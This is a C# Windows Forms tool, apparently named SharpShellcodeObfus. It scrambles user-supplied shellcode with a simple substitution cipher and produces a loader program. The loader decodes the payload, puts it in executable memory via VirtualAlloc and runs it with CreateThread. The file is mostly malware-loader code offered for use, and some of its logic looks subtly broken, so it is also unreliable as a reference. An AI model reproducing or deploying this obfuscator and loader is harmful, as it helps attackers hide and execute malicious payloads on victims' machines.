using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace SharpShellcodeObfus
{
    public partial class Form1 : Form
    {
        int index;

        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            char[] alpha = "abcdefghijklmnopqrstuvwxyz1234567890abcdefghijklmnopqrstuvwxyz".ToCharArray();
            string al = new string(alpha);
            Cipher(al);
        }

        private void Cipher(string al)
        {
            String ObfusShellcode = "";

            char[] charArray = textBox1.Text.ToCharArray();
            string ch = new string(charArray);

            index = int.Parse(numericUpDown1.Text);

            for (int i = 0; i < ch.Length; i++)
            {

                if (al.Contains(charArray[i].ToString()))
                {
                    for (int j = 0; j < al.Length; j++)
                    {
                        if (ch[i] == al[j])
                        {
                            ObfusShellcode += ((al[j + index]).ToString());
                            break;
                        }
                    }
                }
                else
                {
                    
                    ObfusShellcode += (charArray[i].ToString());
                }
                string loaders = @"using System;
                            using System.Collections.Generic;
                            using System.Linq;
                            using System.Runtime.InteropServices;
                            using System.Text;

                            namespace part1
                                {
                                    class Program
                                    {
                                        static void Main(string[] args)
                                        {
                                           char[] revalpha = ""zyxwvutsrqponmlkjihgfedcba0987654321zyxwvutsrqponmlkjihgfedcba"".ToCharArray();
                                           string reval = new string(revalpha);
                                           string defobfshellcode = """";
                                            string shellcodes = ""REPLACE SHELLCODE HERE"";
                                            defobfshellcode =  Cipher(reval,shellcodes);
                                            byte[] decBytes = System.Text.Encoding.UTF8.GetBytes(defobfshellcode);
                                            UInt32 MEM_COMMIT = 0x1000;
                                            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
                                            UInt32 funcAddr = VirtualAlloc(0x0000, (UInt32)decBytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                                            Marshal.Copy(decBytes, 0x0000, (IntPtr)(funcAddr), decBytes.Length);
                                            IntPtr hThread = IntPtr.Zero;
                                            UInt32 threadId = 0x0000;
                                            IntPtr pinfo = IntPtr.Zero;
                                            hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);
                                            WaitForSingleObject(hThread, 0xffffffff);
                                        }
                                        
                                            public static string Cipher(string al,string obfshellcode){

                                                string deobfshellcode = """";
                                                int index = 2222;
                                                char[] charArray = obfshellcode.ToCharArray();
                                                string ch = new string(charArray);


                                                for (int i = 0; i < ch.Length; i++)
                                                {

                                                    if (al.Contains(charArray[i].ToString()))
                                                    {
                                                        for (int j = 0; j < al.Length; j++)
                                                        {
                                                            if (ch[i] == al[j])
                                                            {
                                                                deobfshellcode += ((al[j + index]).ToString());
                                                                break;
                                                            }
                                                        }
                                                    }
                                                    else
                                                    {
                                                        deobfshellcode += (charArray[i].ToString());
                                                    }
                                                }

                                                return deobfshellcode;
                                            }


        
                                        [DllImport(""kernel32"")]
                                        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
                                        [DllImport(""kernel32"")]
                                        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
                                        [DllImport(""kernel32"")]
                                        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
                                    }
                                }";
                loaders = loaders.Replace("\"REPLACE SHELLCODE HERE\"", "\"" + ObfusShellcode + "\"").Replace("2222",index.ToString());
                textBox2.Text = loaders;
            }
        }
    }
}
